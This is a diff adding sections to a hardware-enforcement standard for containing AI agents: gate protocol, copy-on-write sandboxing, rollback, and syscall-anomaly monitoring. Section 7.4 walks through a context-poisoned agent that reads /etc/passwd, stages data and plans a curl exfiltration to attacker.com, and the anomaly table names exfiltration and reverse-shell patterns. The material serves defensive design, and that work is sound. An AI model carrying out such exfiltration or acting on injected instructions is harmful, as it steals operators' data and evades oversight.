@@ -184,6 +184,215 @@ Terms defined in AOS-CORE-001 Section 3 apply. Additional terms:
 
 Key difference from AOS-CORE-001: In the software-only architecture, the kernel is **fully trusted** (it enforces process isolation). In AOS-HARD-001, the kernel is **partially trusted** — it manages execution environments but the enforcement decision is made in hardware that the kernel cannot influence.
 
+### 4.3 Hardware Communication Protocol
+
+The hardware gate communicates with the agent host through a defined message protocol over the hardware channel (PCIe BAR, MMIO region, or dedicated serial bus). The protocol is stateless per-request and operates in a strict request-response pattern.
+
+**Message Format:**
+
+```
+┌────────────────────────────────────────────────────────────┐
+│                   GATE REQUEST MESSAGE                      │
+├──────────┬──────────┬──────────┬───────────────────────────┤
+│ Msg ID   │ Msg Type │ Length   │ Payload (CBOR-encoded)    │
+│ (8 bytes)│ (1 byte) │ (4 bytes)│ (variable)                │
+├──────────┼──────────┼──────────┼───────────────────────────┤
+│ HMAC-SHA256 Authentication Tag (32 bytes)                   │
+└────────────────────────────────────────────────────────────┘
+
+Msg Types:
+  0x01 = EVALUATE    (tool call request → enforcement pipeline)
+  0x02 = APPROVE     (human approval token delivery)
+  0x03 = POLICY_LOAD (signed policy bundle → gate storage)
+  0x04 = JOURNAL_READ(audit export request)
+  0x05 = STATUS      (gate health/version query)
+  0x06 = KILL        (manual kill switch trigger)
+```
+
+```
+┌────────────────────────────────────────────────────────────┐
+│                   GATE RESPONSE MESSAGE                     │
+├──────────┬──────────┬──────────┬───────────────────────────┤
+│ Msg ID   │ Decision │ Length   │ Payload (CBOR-encoded)    │
+│ (8 bytes)│ (1 byte) │ (4 bytes)│ (attestation + evidence)  │
+├──────────┼──────────┼──────────┼───────────────────────────┤
+│ HSM Signature (Ed25519, 64 bytes)                           │
+└────────────────────────────────────────────────────────────┘
+
+Decision Codes:
+  0x00 = DENY
+  0x01 = ALLOW
+  0x02 = ESCALATE (approval required)
+  0x03 = ERROR    (gate internal failure → fail-closed)
+```
+
+**R-HW-010:** All messages between the agent host and the hardware gate MUST be authenticated using HMAC-SHA256 with a key derived from a shared secret established during measured boot. The gate MUST reject any message with an invalid or missing HMAC.
+
+**R-HW-011:** The hardware gate MUST process messages sequentially in the order received. Concurrent request interleaving is NOT permitted. If the gate receives a new EVALUATE request while processing a prior request, it MUST queue the new request (up to a configurable queue depth, default: 16) or reject it with a BUSY response.
+
+**R-HW-012:** The gate MUST respond to every EVALUATE request within the latency budget (see Section 4.5). If the gate cannot complete evaluation within the budget, it MUST return a DENY decision with reason `TIMEOUT_FAIL_CLOSED`.
+
+### 4.4 Enforcement Walkthrough: Hardware Path
+
+This section traces a single tool call through the hardware enforcement pipeline. This walkthrough parallels AOS-CORE-001 Section 4.3 but shows the hardware-enforced path.
+
+**Scenario:** An AI agent in a Sovereign-tier deployment attempts to write a file to the production configuration directory.
+
+```
+Tool call: write_file
+Arguments:
+  path: /etc/nginx/sites-enabled/production.conf
+  content: "server { listen 443 ssl; ... }"
+```
+
+**Step 1: Agent submits tool call**
+
+The agent's runtime constructs the tool call request and submits it to the hardware communication channel driver. The driver serializes the request as a CBOR-encoded EVALUATE message, computes the HMAC-SHA256 tag using the session key, and writes the message to the PCIe BAR region mapped to the hardware gate.
+
+```
+Host → Gate: EVALUATE {
+  msg_id: 0x0000000000000042,
+  actor: "agent-prod-west-1",
+  tool: "write_file",
+  arguments: { path: "/etc/nginx/sites-enabled/production.conf", ... },
+  policy_digest: "sha256:a1b2c3d4...",
+  budget_snapshot: { writes_remaining: 14, cost_remaining: 850 },
+  timestamp: 1749120000,
+  hmac: "e5f6a7b8..."
+}
+```
+
+**Step 2: Hardware gate receives and authenticates**
+
+The gate's input controller verifies the HMAC tag against the session key stored in the HSM. If the HMAC is invalid, the gate discards the message and writes a journal entry recording the authentication failure. No response is sent — the host side times out and treats this as a DENY.
+
+**Step 3: Policy evaluation in silicon**
+
+The gate loads the policy from its on-board verified policy ROM and evaluates the 11-step enforcement pipeline entirely in hardware logic:
+
+1. ✅ Request integrity verified (HMAC valid)
+2. ✅ Policy integrity verified (digest matches ROM hash)
+3. ✅ Tool `write_file` is in allowlist
+4. ❌ **Scope check fails:** `/etc/nginx/sites-enabled/` is outside the permitted scope `{paths: ["/app/config/*"]}`
+5. — Remaining steps not reached (fail-fast)
+
+**Step 4: Hardware gate issues DENY**
+
+The gate constructs a DENY response, signs it with the HSM's Ed25519 key, and writes it to the response region of the PCIe BAR.
+
+```
+Gate → Host: DENY {
+  msg_id: 0x0000000000000042,
+  decision: 0x00,
+  reason: "SCOPE_VIOLATION",
+  matched_rule: "R-ENF-002",
+  denied_field: "path",
+  denied_value: "/etc/nginx/sites-enabled/production.conf",
+  permitted_scope: "/app/config/*",
+  signature: "<Ed25519 over full payload>"
+}
+```
+
+**Step 5: CoW rollback triggered**
+
+Because the DENY occurred during an active task, the host-side enforcement harness triggers atomic rollback of the CoW upper layer. Any filesystem modifications the agent made prior to this denied call are atomically discarded. The system returns to the verified baseline.
+
+**Step 6: Syscall monitor records the event**
+
+The eBPF-based syscall trajectory monitor observes the denied write attempt and records the syscall sequence (`openat("/etc/nginx/...") → EPERM`). This data point is added to the agent's trajectory log. If the agent repeatedly attempts out-of-scope writes, the trajectory monitor will flag a velocity anomaly.
+
+**Step 7: Journal entry**
+
+The hardware gate writes an append-only journal entry:
+
+```json
+{
+  "seq": 1042,
+  "timestamp": 1749120000,
+  "msg_id": "0x0000000000000042",
+  "decision": "DENY",
+  "reason": "SCOPE_VIOLATION",
+  "actor": "agent-prod-west-1",
+  "tool": "write_file",
+  "denied_path": "/etc/nginx/sites-enabled/production.conf",
+  "chain_hash": "sha256:prev_hash+this_entry",
+  "signature": "<HSM Ed25519>"
+}
+```
+
+The journal entry is signed by the HSM and chained to the previous entry. The chain is verifiable externally.
+
+> **Note:** At no point in this sequence did any software on the agent's host participate in the enforcement decision. The kernel facilitated the PCIe communication, but the decision logic, the signing key, and the journal are all inside the hardware enforcement boundary.
+
+### 4.5 Performance Requirements
+
+Hardware enforcement must be fast enough to be operationally viable. A gate that is correct but adds 500ms to every tool call will be bypassed in practice.
+
+| Metric | Requirement | Rationale |
+|--------|-------------|----------|
+| **Decision latency (P50)** | ≤ 1 ms | Policy evaluation for simple allow/deny in hardware should complete in microseconds. 1ms budget accounts for serialization overhead. |
+| **Decision latency (P99)** | ≤ 5 ms | Complex policy evaluation with budget lookups and category matching. |
+| **Decision latency (P99.9)** | ≤ 20 ms | Worst case including queue contention and journal write. |
+| **Journal write latency** | ≤ 2 ms | Append-only write to non-volatile storage. |
+| **Kill switch activation** | ≤ 10 ms | From trigger detection to power relay activation. |
+| **CoW rollback** | ≤ 100 ms | OverlayFS unmount + upper layer purge. |
+| **Queue depth** | ≥ 16 messages | Configurable; prevents starvation under burst load. |
+| **Throughput** | ≥ 1,000 decisions/second | Sustained throughput for high-frequency agent operations. |
+
+**R-HW-013:** The hardware gate MUST publish latency metrics for external monitoring. Latency degradation exceeding 2x the P99 target for more than 60 seconds MUST trigger an alert.
+
+**R-HW-014:** If the hardware gate cannot meet the P99.9 latency requirement, it MUST return a DENY with reason `LATENCY_EXCEEDED` rather than silently delaying. An indefinite hang is a security vulnerability (the agent could exploit timeouts to bypass enforcement).
+
+### 4.6 Multi-Agent Hardware Topology
+
+Sovereign-tier deployments may run multiple agents on a shared hardware infrastructure. This section defines how multiple agents share (or do not share) hardware enforcement resources.
+
+**Architecture A: Dedicated Gate Per Agent**
+
+```
+┌──────────────────────┐    ┌──────────────────────┐
+│ Agent A              │    │ Agent B              │
+│ CoW Sandbox A        │    │ CoW Sandbox B        │
+└──────────┬───────────┘    └──────────┬───────────┘
+           │                            │
+     ┌─────▼─────┐                ┌─────▼─────┐
+     │ HW Gate A │                │ HW Gate B │
+     │ Policy A  │                │ Policy B  │
+     │ Journal A │                │ Journal B │
+     └───────────┘                └───────────┘
+```
+
+**Highest isolation.** Each agent has its own hardware gate, policy, and journal. Compromise of one agent's infrastructure cannot affect another. Cost scales linearly with agent count.
+
+**Architecture B: Shared Gate with Partitioned State**
+
+```
+┌──────────────────────┐    ┌──────────────────────┐
+│ Agent A              │    │ Agent B              │
+│ CoW Sandbox A        │    │ CoW Sandbox B        │
+└──────────┬───────────┘    └──────────┬───────────┘
+           │                            │
+           └────────────┬───────────────┘
+                   ┌────▼────┐
+                   │ HW Gate │
+                   │ (shared)│
+                   ├─────────┤
+                   │Policy A │
+                   │Policy B │
+                   ├─────────┤
+                   │Journal  │
+                   │(unified)│
+                   └─────────┘
+```
+
+**Lower cost.** Gate hardware is shared. Policies are partitioned (each agent evaluates against its own policy). The journal is unified but each entry is tagged with the agent identity.
+
+**R-HW-015:** In shared gate deployments, agent policy partitioning MUST be enforced in hardware. Agent A's EVALUATE message MUST NOT be evaluated against Agent B's policy. The gate MUST verify the requesting agent's identity against the policy partition before evaluation.
+
+**R-HW-016:** In shared gate deployments, a kill switch activation for one agent MUST NOT affect other agents unless the kill trigger is a gate-level failure (hardware fault, journal capacity exceeded, firmware compromise). Agent-specific kill (e.g., trajectory anomaly for Agent A) MUST terminate only Agent A's execution environment.
+
+**R-HW-017:** Shared gate deployments MUST implement fair queuing. No single agent MAY monopolize the gate's evaluation capacity. Round-robin or weighted-fair-queue scheduling is REQUIRED.
+
 ---
 
 ## 5. Hardware Gate Requirements
@@ -233,6 +442,108 @@ Key difference from AOS-CORE-001: In the software-only architecture, the kernel 
 
 **R-HW-009:** The hardware gate MUST support firmware version attestation. External verifiers MUST be able to query the gate for its current firmware version and verify that version against a published reference hash.
 
+### 5.5 Measured Boot Chain
+
+**R-HW-018:** Sovereign-tier deployments MUST implement a measured boot chain from firmware through the hardware gate initialization. The chain MUST:
+
+1. Measure (hash) each boot component before executing it
+2. Record measurements in TPM Platform Configuration Registers (PCRs)
+3. Provide remote attestation capability so that external verifiers can confirm the system booted into a known-good state
+4. Refuse to release the hardware gate's session key unless all measurements match the expected values
+
+```
+Boot Sequence (Measured):
+
+  BIOS/UEFI → measures → Bootloader → measures → Kernel → measures → 
+  Gate Driver → measures → Gate Firmware Verification → 
+  Session Key Release (only if all PCRs match expected values)
+```
+
+**R-HW-019:** If any measurement in the boot chain does not match the expected value, the hardware gate MUST enter fail-closed mode. The session key MUST NOT be released. The agent MUST NOT be permitted to execute.
+
+### 5.6 Hardware Reference Architectures
+
+This section provides informative guidance on implementing the hardware gate in common deployment environments.
+
+#### 5.6.1 Server-Class Deployment (Data Center)
+
+```
+┌──────────────────────────────────────────────────┐
+│                SERVER CHASSIS                     │
+│                                                   │
+│  ┌───────────┐   PCIe x4    ┌─────────────────┐  │
+│  │ Host CPU  │──────────────▶│ FPGA Card       │  │
+│  │ (Agents)  │              │ (Xilinx/Intel)  │  │
+│  │           │              │                 │  │
+│  │ RAM       │              │ Gate Logic      │  │
+│  │ (agent    │              │ HSM Chip        │  │
+│  │  memory)  │              │ NVRAM Journal   │  │
+│  │           │              │ Kill Relay      │  │
+│  └───────────┘              └─────────────────┘  │
+│                                                   │
+│  eBPF Monitor ◄──── kernel-space ────►  CoW FS   │
+└──────────────────────────────────────────────────┘
+```
+
+- FPGA card in PCIe slot (e.g., Xilinx Alveo, Intel Agilex)
+- On-card HSM chip for key storage
+- On-card NVRAM or battery-backed SRAM for journal
+- Kill relay on card cuts PCIe bus power to host CPU or asserts reset
+- Estimated BOM: $200-800 per server (FPGA card + HSM)
+
+#### 5.6.2 Edge Deployment (Industrial / IoT)
+
+```
+┌──────────────────────────────────────────────────┐
+│              EDGE COMPUTE NODE                    │
+│                                                   │
+│  ┌───────────┐   SPI/I2C    ┌─────────────────┐  │
+│  │ SoC       │──────────────▶│ Secure Element  │  │
+│  │ (Agent)   │              │ (SE050/ATECC)   │  │
+│  │           │              │                 │  │
+│  │           │              │ Gate Logic      │  │
+│  │           │              │ Key Storage     │  │
+│  │           │              │ Mini-Journal    │  │
+│  └───────────┘              └─────────────────┘  │
+│                                                   │
+│  seccomp-bpf ◄── kernel ───► SquashFS + tmpfs    │
+└──────────────────────────────────────────────────┘
+```
+
+- Secure element chip (e.g., NXP SE050, Microchip ATECC608) on SPI/I2C bus
+- Constrained gate logic in secure element firmware
+- Smaller journal capacity (export frequently)
+- SquashFS read-only base + tmpfs upper layer for CoW
+- Estimated BOM: $5-50 per unit
+
+#### 5.6.3 Embedded Deployment (Robotics / Embodied AI)
+
+```
+┌──────────────────────────────────────────────────┐
+│              ROBOTIC PLATFORM                     │
+│                                                   │
+│  ┌───────────┐  AXI Bus    ┌──────────────────┐  │
+│  │ Main SoC  │────────────▶│ FPGA Fabric      │  │
+│  │ (Agent +  │             │ (on-SoC or       │  │
+│  │  Motor    │             │  companion die)  │  │
+│  │  Control) │             │                  │  │
+│  │           │             │ Gate Logic       │  │
+│  │           │             │ eFuse Keys       │  │
+│  │           │             │ OTP Journal      │  │
+│  │           │             │ Motor Kill Line  │  │
+│  └───────────┘             └──────────────────┘  │
+│                                                   │
+│  Note: Kill switch cuts motor power bus directly  │
+│  Journal in one-time-programmable (OTP) fuses     │
+└──────────────────────────────────────────────────┘
+```
+
+- FPGA fabric on the SoC (e.g., Xilinx Zynq) or companion die
+- eFuse-based key storage (permanent, unreadable from application processor)
+- Kill switch directly cuts motor driver power bus
+- Critical for AOS-CORE-001 Condition 2 (embodied AI safety)
+- Estimated BOM: $20-200 per unit (depends on SoC selection)
+
 ---
 
 ## 6. Copy-on-Write Execution Environment
@@ -262,17 +573,120 @@ Key difference from AOS-CORE-001: In the software-only architecture, the kernel 
 
 **R-COW-003:** Atomic rollback MUST NOT depend on the agent's cooperation. The rollback is a kernel operation (unmount + purge) that executes regardless of the agent's state.
 
-### 6.2 Commit Protocol
+### 6.2 Mount Topology and Implementation
+
+The CoW implementation uses layered filesystem semantics. This section specifies the mount topology in detail.
+
+**R-COW-007:** The implementation MUST provision the CoW environment using one of the following filesystem mechanisms:
+
+| Mechanism | Maturity | Features | Recommended For |
+|-----------|----------|----------|----------------|
+| **OverlayFS** | Production (Linux 3.18+) | Simple upper/lower semantics; redirect_dir; metacopy | Server, Edge |
+| **Btrfs subvolumes** | Production (Linux 5.x+) | Snapshots, send/receive, inline CoW, compression | Server (high I/O) |
+| **ZFS clones** | Production (OpenZFS) | Snapshots, checksums, native encryption | Server (data integrity) |
+| **Device Mapper thin provisioning** | Production | Block-level CoW, flexible | Server (block storage) |
+
+**R-COW-008:** The CoW mount MUST be initialized with the following properties:
+
+```bash
+# OverlayFS reference implementation
+# Provisioned by the host orchestrator, NOT by the agent
+
+BASELINE="/var/aos/baselines/${BASELINE_ID}"    # Verified, read-only
+UPPER="/var/aos/ephemeral/${TASK_ID}/volatile"   # Agent writes here
+WORK="/var/aos/ephemeral/${TASK_ID}/work"        # OverlayFS internal
+MERGED="/var/aos/active/${TASK_ID}"              # Agent's view
+
+# 1. Verify baseline integrity before mount
+BASELINE_HASH=$(sha256sum -b "${BASELINE}.squashfs" | cut -d' ' -f1)
+if [ "${BASELINE_HASH}" != "${EXPECTED_HASH}" ]; then
+    echo "FATAL: Baseline integrity failure" >&2
+    exit 1  # Do not proceed
+fi
+
+# 2. Mount baseline as read-only
+mount -o ro,loop "${BASELINE}.squashfs" "${BASELINE}"
+
+# 3. Create ephemeral upper layer (tmpfs for zero-persistence guarantee)
+mount -t tmpfs -o size=4G,mode=0700 tmpfs "${UPPER}"
+mkdir -p "${WORK}"
+
+# 4. Mount overlay
+mount -t overlay overlay \
+    -o "lowerdir=${BASELINE},upperdir=${UPPER},workdir=${WORK}" \
+    "${MERGED}"
+
+# 5. Agent process chrooted into ${MERGED}
+# Agent sees merged view; writes go to upper layer
+# Agent cannot access /var/aos/ directly
+```
+
+**R-COW-009:** The upper layer MUST be backed by `tmpfs` (RAM-based) for Sovereign-tier deployments. Disk-backed upper layers leave residue in unallocated blocks even after deletion. RAM-based upper layers are zeroed on unmount.
+
+### 6.3 Commit Protocol
 
 **R-COW-004:** If a task completes successfully (all tool calls ALLOWED, all attestations verified), the upper layer modifications MAY be committed to the baseline through a controlled promotion process. Promotion MUST:
 
-- Verify that all tool calls in the task have valid attestations
-- Record the promotion in the hardware gate's journal
-- Create a new baseline snapshot with a verified integrity hash
+1. Verify that ALL tool calls in the task have valid attestations in the hardware journal
+2. Compute a content hash of the upper layer changes
+3. Submit the commit request to the hardware gate for authorization
+4. Wait for the hardware gate to sign the commit attestation
+5. Merge the upper layer into a new baseline snapshot
+6. Compute and record the new baseline's integrity hash
+7. Record the promotion in the hardware gate's journal, including:
+   - Previous baseline hash
+   - New baseline hash
+   - List of tool call attestation IDs that authorized the changes
+   - Commit attestation signature
+
+```
+Commit lifecycle:
+
+  Task Start → [CoW Upper Created]
+       │
+  Tool Call 1 → [HW Gate: ALLOW + Attestation]
+  Tool Call 2 → [HW Gate: ALLOW + Attestation]
+  Tool Call N → [HW Gate: ALLOW + Attestation]
+       │
+  Task Complete → [All attestations verified?]
+       │                    │
+       │ YES                │ NO
+       ▼                    ▼
+  [Commit Request      [Atomic Rollback]
+   to HW Gate]         [Upper Layer Purged]
+       │
+  [Gate signs commit attestation]
+       │
+  [Upper merged to new baseline]
+  [New baseline hash recorded]
+```
 
 **R-COW-005:** Uncommitted upper layers MUST be automatically purged after a configurable timeout (default: 1 hour). No ephemeral state SHALL persist indefinitely.
 
-### 6.3 Residue Prevention
+### 6.4 Concurrent Task Handling
+
+**R-COW-010:** Each concurrent agent task MUST have its own isolated CoW upper layer. Upper layers MUST NOT be shared between tasks or between agents.
+
+**R-COW-011:** If two concurrent tasks attempt to modify the same file, the conflict MUST be detected at commit time. The first task to commit succeeds; subsequent tasks that conflict MUST be rolled back and re-evaluated against the updated baseline.
+
+```
+Concurrent task conflict resolution:
+
+  Task A writes /app/config/db.yml → Upper Layer A
+  Task B writes /app/config/db.yml → Upper Layer B
+       │                                    │
+  Task A commits first                 Task B attempts commit
+       │                                    │
+  [New baseline includes A's changes]  [Conflict detected: 
+       │                                db.yml modified since 
+  ✅ Success                            Task B's baseline]
+                                            │
+                                       [Rollback Task B]
+                                       [Re-execute against
+                                        new baseline]
+```
+
+### 6.5 Residue Prevention
 
 **R-COW-006:** After atomic rollback, the implementation MUST guarantee zero residue. Specifically:
 
@@ -281,6 +695,19 @@ Key difference from AOS-CORE-001: In the software-only architecture, the kernel 
 - No new processes spawned by the agent survive
 - No network connections initiated by the agent remain open
 - Memory pages used by the agent are zeroed
+- No IPC artifacts (shared memory segments, message queues, semaphores) persist
+- No temporary files in /tmp or equivalent survive
+
+**R-COW-012:** The rollback procedure MUST execute in the following order to prevent information leakage:
+
+1. **Kill all processes** in the agent's process group (SIGKILL, not SIGTERM — no cleanup handlers)
+2. **Close all file descriptors** held by agent processes
+3. **Terminate all network connections** (TCP RST, UDP close)
+4. **Destroy IPC artifacts** (shmdt, msgctl IPC_RMID, semctl IPC_RMID)
+5. **Unmount the CoW overlay** (umount -l for lazy unmount if busy)
+6. **Purge the upper layer directory** (rm -rf on tmpfs — instant)
+7. **Zero the tmpfs mount** (umount zeroes RAM pages)
+8. **Record rollback completion** in hardware journal
 
 This requirement ensures that a denied agent session leaves no trace that could be exploited by subsequent sessions.
 
@@ -311,23 +738,127 @@ A compromised agent may produce tool calls that individually pass policy validat
 - The agent's tool set changes
 - The policy changes in ways that affect permitted operations
 
+#### 7.2.1 Training Phase Protocol
+
+The baseline training phase operates in a controlled environment to establish the statistical model of normal behavior.
+
+**R-SYS-007:** The training phase MUST consist of at least three stages:
+
+1. **Controlled execution:** The agent executes a curated set of known-safe tasks covering all permitted tool categories. Syscall traces are recorded for each task.
+2. **Statistical modeling:** The recorded traces are aggregated to compute per-tool-category statistical parameters:
+   - Mean and standard deviation of syscall velocity per tool
+   - Maximum observed burst rate (with 99th percentile headroom)
+   - Entropy distribution of write data per tool
+   - Process tree depth ceiling per tool
+   - Canonical syscall sequence signatures per tool
+3. **Validation:** The trained model is validated against a held-out set of known-safe tasks AND a set of known-malicious traces. The model MUST achieve:
+   - Zero false negatives on the malicious trace set
+   - False positive rate < 1% on the known-safe held-out set
+
+**R-SYS-008:** The baseline model MUST include per-tool profiles. Different tools produce different syscall patterns, and a single global threshold will either miss narrow attacks or produce excessive false positives.
+
+```
+Baseline model structure:
+
+{
+  "version": "1.0",
+  "agent_model": "gpt-5-20260601",
+  "policy_digest": "sha256:a1b2c3d4...",
+  "created": "2026-06-05T00:00:00Z",
+  "global": {
+    "max_total_velocity": 5000,    // syscalls/sec across all tools
+    "max_fork_depth": 3,
+    "max_concurrent_fds": 256
+  },
+  "per_tool": {
+    "write_file": {
+      "mean_velocity": 120,
+      "stddev_velocity": 45,
+      "max_burst": 350,
+      "mean_write_entropy": 4.2,
+      "max_write_entropy": 6.5,
+      "canonical_sequences": [
+        ["openat", "write", "fsync", "close"],
+        ["openat", "ftruncate", "write", "close"]
+      ]
+    },
+    "execute_command": {
+      "mean_velocity": 800,
+      "stddev_velocity": 300,
+      "max_burst": 2000,
+      "allowed_execve_targets": ["/usr/bin/git", "/usr/bin/npm"],
+      "max_fork_depth": 3
+    }
+  },
+  "signature": "<HSM Ed25519 over entire model>"
+}
+```
+
+#### 7.2.2 False Positive Handling
+
+**R-SYS-009:** The syscall trajectory monitor MUST distinguish between alert severity levels:
+
+| Severity | Threshold | Response |
+|----------|-----------|----------|
+| **NOTICE** | Metric exceeds baseline mean + 2σ | Log only. No enforcement action. |
+| **WARNING** | Metric exceeds baseline mean + 3σ | Log + alert to operator. Agent continues. |
+| **CRITICAL** | Metric exceeds baseline maximum OR matches known malicious sequence | Log + alert + suspend agent. Hardware kill switch MAY activate. |
+| **EMERGENCY** | Multiple CRITICAL indicators simultaneously OR monitoring system under attack | Hardware kill switch MUST activate immediately. |
+
+**R-SYS-010:** False positive events (operator-confirmed legitimate behavior that triggered an alert) MUST be recorded and used to refine the baseline during the next training phase. The baseline MUST NOT be automatically adjusted during runtime — adjustments require an explicit retraining cycle.
+
 ### 7.3 Runtime Monitoring
 
 **R-SYS-003:** During agent execution, the implementation MUST continuously monitor the agent's syscall stream using kernel-space instrumentation (eBPF, seccomp-bpf, or equivalent) and compare it against the established baseline.
 
 **R-SYS-004:** The following deviations MUST trigger an alert and MAY trigger the hardware kill switch:
 
-| Deviation | Indicator | Likely Cause |
-|-----------|-----------|-------------|
-| **Velocity anomaly** | Syscall rate exceeds baseline maximum by configurable factor (default: 3x) | Automated payload execution, denial-of-service |
-| **Sequence anomaly** | Syscall sequence matches known malicious trajectory (e.g., `socket() → connect() → sendmsg()` to non-allowlisted IP) | Data exfiltration, reverse shell |
-| **Entropy anomaly** | Write entropy exceeds baseline maximum | Ransomware encryption, steganographic encoding |
-| **Fork depth anomaly** | Process tree depth exceeds baseline maximum | Privilege escalation, fork bomb |
-| **Temporal anomaly** | Syscall timing deviates from baseline distribution | Timing side-channel exploitation |
+| Deviation | Indicator | Likely Cause | Severity |
+|-----------|-----------|-------------|----------|
+| **Velocity anomaly** | Syscall rate exceeds baseline maximum by configurable factor (default: 3x) | Automated payload execution, denial-of-service | CRITICAL |
+| **Sequence anomaly** | Syscall sequence matches known malicious trajectory (e.g., `socket() → connect() → sendmsg()` to non-allowlisted IP) | Data exfiltration, reverse shell | CRITICAL |
+| **Entropy anomaly** | Write entropy exceeds baseline maximum | Ransomware encryption, steganographic encoding | WARNING → CRITICAL |
+| **Fork depth anomaly** | Process tree depth exceeds baseline maximum | Privilege escalation, fork bomb | CRITICAL |
+| **Temporal anomaly** | Syscall timing deviates from baseline distribution (e.g., suspiciously uniform intervals) | Timing side-channel exploitation | WARNING |
+| **File descriptor exhaustion** | Open FD count exceeds baseline maximum | Resource exhaustion attack | WARNING → CRITICAL |
+| **Network enumeration** | Burst of `connect()` to multiple IP addresses | Port scanning, lateral movement | CRITICAL |
 
 **R-SYS-005:** Syscall monitoring MUST be independent of the agent's process. The monitoring daemon MUST run in a separate security domain (kernel space or dedicated namespace) that the agent cannot access or modify.
 
 **R-SYS-006:** If the syscall monitoring system is terminated or becomes unresponsive, the hardware gate MUST enter fail-closed mode. The agent MUST NOT be permitted to execute while syscall monitoring is unavailable.
+
+### 7.4 Attack Chain Example: Context Poisoning Detection
+
+This example demonstrates how syscall trajectory baselining detects a context-poisoned agent that a software-only DPG would miss.
+
+**Scenario:** An attacker injects a subtle prompt into the agent's context over 50 interactions. The agent gradually shifts from writing configuration files to enumerating the filesystem and staging data for exfiltration. Each individual tool call passes DPG policy (the agent has `write_file` and `read_file` permissions).
+
+```
+Interaction 1-40: Normal behavior
+  Tool calls: write_file("/app/config/..."), read_file("/app/logs/...")
+  Syscall trajectory: NORMAL (within baseline)
+  DPG decisions: ALLOW, ALLOW, ALLOW...
+
+Interaction 41-45: Reconnaissance begins
+  Tool calls: read_file("/etc/passwd"), read_file("/etc/hosts")
+  Syscall trajectory: WARNING — unusual openat() targets
+  DPG decisions: ALLOW (files are within permitted read scope)
+  ⚠️ Syscall monitor: NOTICE logged
+
+Interaction 46-48: Staging
+  Tool calls: write_file("/app/config/backup.tar.gz")
+  Syscall trajectory: CRITICAL — write entropy = 7.8 (baseline max: 6.5)
+  DPG decisions: ALLOW (path is in permitted write scope)
+  🚨 Syscall monitor: CRITICAL — entropy anomaly
+  → Agent suspended. Operator alerted.
+
+Interaction 49: (never reached)
+  Planned: execute_command("curl -X POST https://attacker.com/exfil ...")
+  The exfiltration attempt is prevented because the agent was
+  suspended at Interaction 48 based on entropy anomaly.
+```
+
+**Key insight:** The DPG approved every tool call because each was within policy scope. The syscall trajectory monitor caught the attack because the *pattern of behavior* (low-entropy config writes shifting to high-entropy binary writes) deviated from the baseline. This is the defense-in-depth that AOS-HARD-001 provides beyond AOS-CORE-001.
 
 ---
 
